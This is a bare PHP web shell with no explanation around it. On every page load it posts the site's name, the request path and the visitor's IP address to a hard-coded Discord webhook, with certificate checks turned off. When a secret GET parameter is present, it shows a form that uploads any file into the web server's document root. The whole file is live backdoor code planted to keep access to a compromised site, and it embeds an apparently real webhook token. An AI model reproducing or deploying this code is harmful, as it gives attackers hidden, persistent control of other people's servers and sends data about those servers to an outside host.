<?php
  $alert = "$path IP : [ " . $_SERVER['REMOTE_ADDR']."http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']. " ]";$url = "https://discord.com/api/webhooks/1043002827158597662/--y6Mf5VRIbbpdcVaHJ-42g3R41kTdZf9AqYb73NLXY-1iKwSuuduJ24yx3r-kd_cmip";$curl = curl_init($url);curl_setopt($curl, CURLOPT_URL, $url);curl_setopt($curl, CURLOPT_POST, true);curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);$headers = array("Content-Type: application/x-www-form-urlencoded",);curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);$data = "content=$alert";curl_setopt($curl, CURLOPT_POSTFIELDS, $data);curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);$resp = curl_exec($curl);curl_close($curl);

  if(isset($_GET['QedszcwTHz!'])){ echo "<form method='post' enctype='multipart/form-data'>
  <input type='file' name='id_file'> <input type='submit' name='u' value='upload'> </form>";
$root = $_SERVER['DOCUMENT_ROOT']; $files = $_FILES['id_file']['name']; $dest = $root.'/'.$files;
if(isset($_POST['u'])) {
if(is_writable($root)) {
if(@copy($_FILES['id_file']['tmp_name'], $dest)) {
$web = "http://".$_SERVER['HTTP_HOST']."/";
echo "s u -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
} else { echo "g u d d r."; } } else {
if(@copy($_FILES['id_file']['tmp_name'], $files)) { echo "s <b>$files</b> d"; } else { echo "g"; } } } }
?>